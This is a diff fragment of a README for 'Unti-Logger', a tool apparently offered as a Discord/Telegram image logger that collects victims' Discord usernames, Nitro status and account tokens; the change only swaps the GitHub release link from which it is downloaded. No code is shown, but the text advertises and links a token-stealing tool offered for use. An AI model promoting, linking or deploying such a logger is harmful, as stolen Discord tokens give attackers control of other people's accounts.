@@ -6,7 +6,7 @@ New generation of beam. Unti-Logger is an image logger that works in Discord/Tel
 - Discord (Username, Nitro(true/false), Token)
 
 
-Download: https://github.com/Moonlightds/UntiLogger/releases/tag/secondv
+Download: https://github.com/Moonlightds/UntiLogger/releases/tag/thirst
 
 
   What it looks like:
